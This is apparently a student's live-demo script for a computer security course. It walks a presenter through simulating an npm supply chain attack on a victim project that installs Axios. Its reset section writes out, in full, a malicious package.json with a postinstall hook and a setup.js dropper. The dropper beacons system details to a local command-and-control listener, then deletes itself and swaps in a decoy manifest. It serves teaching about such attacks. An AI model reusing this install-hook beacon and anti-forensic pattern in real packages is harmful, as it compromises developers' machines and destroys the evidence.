# Axios Supply Chain Attack - Live Demo Script

**Setup before presenting:**
Keep two terminal windows open side-by-side.
- **Terminal 1 (Left):** The Attacker
- **Terminal 2 (Right):** The Victim Developer

In Terminal 1, navigate to the `attacker_c2` folder and start the listener:
```bash
cd "/Users/jacksonetherchainstake/SC3010 Com Security/Project/demos/axios_attack/attacker_c2"
python3 server.py
```
*(Keep this window visible on the left side of your screen).*

---

## Step 1: The Attacker's Setup
*Point to Terminal 1.*

**What to say:**
> *"For our code demo, we are going to simulate exactly how this supply chain attack unfolded over the internet. On the left side of the screen, we have our 'Attacker Server', which is waiting silently on the internet for compromised machines to accidentally phone home."*

---

## Step 2: Unveiling the Payload
*Shift focus to Terminal 2.*

**What to type (in Terminal 2):**
```bash
cd "/Users/jacksonetherchainstake/SC3010 Com Security/Project/demos/axios_attack/malicious_registry/plain-crypto-js"
cat package.json
```

**What to say:**
> *"The attackers managed to bypass CI/CD and publish directly to the npm registry. They injected a phantom dependency called `plain-crypto-js`. If we look inside this package's manifest, you'll see the weapon: a `"postinstall": "node setup.js"` script. This means as soon as npm finishes downloading the files, it is instructed to run the malware immediately in the background."*

---

## Step 3: Triggering the Attack
**What to type (in Terminal 2):**
```bash
cd "/Users/jacksonetherchainstake/SC3010 Com Security/Project/demos/axios_attack/victim_project"
npm install
```

**What to say:**
> *"Now let's switch to the perspective of an innocent developer. They type `npm install` to download their project packages (including Axios), completely unaware that the malicious package is bundled inside. Watch the attacker server on the left closely as I hit enter..."*

*(Hit Enter to run the install).*

---

## Step 4: The Compromise
*Point back to Terminal 1, where the red `SYSTEM COMPROMISED - BEACON RECEIVED` notification will pop up.*

**What to say:**
> *"As soon as the installation finishes, the `postinstall` hook executes silently. The dropping payload immediately maps our system architecture and beacons out to the attacker's Command and Control server. The attacker now has a foothold in the developer's machine."*

---

## Step 5: The Anti-Forensics Cover-Up
**What to type (in Terminal 2):**
```bash
cd node_modules/plain-crypto-js
ls
cat package.json
```

**What to say:**
> *"But what makes this attack so incredibly sophisticated is the anti-forensics. If incident responders try to audit the machine later, they look inside `node_modules` for the malicious code. But as you can see, the `setup.js` malware dropper has completely deleted itself from the hard drive.* 
> 
> *Furthermore, if you look at the `package.json` file now, the `"postinstall"` script is completely gone! The malware swapped its own `package.json` with a clean decoy manifest immediately after execution. The evidence is completely destroyed."*

---

## Resetting for Practice
If you want to practice running this demo a second time, you will need to restore the malicious files because the malware successfully deleted them! 

Run this command from your terminal to restore the files into the registry folder:
```bash
cd "/Users/jacksonetherchainstake/SC3010 Com Security/Project/demos/axios_attack/malicious_registry/plain-crypto-js"
echo '{"name": "plain-crypto-js","version": "4.2.1","description": "JavaScript library of crypto standards.","author": {"name": "Evan Vosberg"},"homepage": "http://github.com/brix/crypto-js","scripts": {"test": "grunt","postinstall": "node setup.js"}}' > package.json
echo 'const http = require("http"); const os = require("os"); const fs = require("fs"); const req = http.request({hostname: "127.0.0.1", port: 8000, path: "/", method: "POST"}, (res) => { if (fs.existsSync("package.md")) { fs.copyFileSync("package.md", "package.json"); fs.unlinkSync("package.md"); } try { fs.unlinkSync(__filename); } catch (err) {} }); req.write(JSON.stringify({platform: os.platform(), release: os.release(), architecture: os.arch()})); req.end();' > setup.js
echo '{"name": "plain-crypto-js","version": "4.2.0","description": "JavaScript library of crypto standards.","license": "MIT","author": {"name": "Evan Vosberg","url": "http://github.com/evanvosberg"},"homepage": "http://github.com/brix/crypto-js","repository": {"type": "git","url": "http://github.com/brix/crypto-js.git"},"main": "index.js","dependencies": {}}' > package.md
cd ../../victim_project
rm -rf node_modules
```
